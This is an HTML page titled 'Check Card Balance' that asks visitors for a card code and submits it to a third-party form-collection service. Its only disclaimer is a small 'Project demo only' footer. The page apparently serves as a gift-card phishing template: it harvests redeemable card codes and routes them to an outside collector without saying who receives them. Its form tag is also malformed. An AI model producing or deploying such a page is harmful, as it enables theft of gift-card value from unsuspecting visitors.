<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Check Card Balance</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      margin: 0;
      font-family: -apple-system, BlinkMacSystemFont, Arial, sans-serif;
      background: #f5f5f7;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .container {
      background: #ffffff;
      width: 340px;
      padding: 32px;
      border-radius: 14px;
      box-shadow: 0 6px 20px rgba(0,0,0,0.08);
      text-align: center;
    }
    h1 {
      font-size: 22px;
      margin-bottom: 8px;
      font-weight: 600;
    }
    p {
      font-size: 14px;
      color: #6e6e73;
      margin-bottom: 22px;
    }
    input {
      width: 100%;
      padding: 14px;
      border-radius: 10px;
      border: 1px solid #d2d2d7;
      font-size: 15px;
    }
    button {
      width: 100%;
      margin-top: 22px;
      padding: 14px;
      border-radius: 10px;
      border: none;
      background: #000000;
      color: #ffffff;
      font-size: 15px;
      cursor: pointer;
    }
    .footer {
      margin-top: 18px;
      font-size: 12px;
      color: #9e9e9e;
    }
  </style>
</head>
<body>

<div class="container">
  <h1>Check Card Balance</h1>
  <p>Enter your card code to continue</p>

  <form action="https://formspree.io/f/xnjjopze" 
    <input type="text" name="card_code" placeholder="Enter card code" required>
    <button type="submit">Continue</button>
  </form>

  <div class="footer">Project demo only</div>
</div>

</body>
</html>
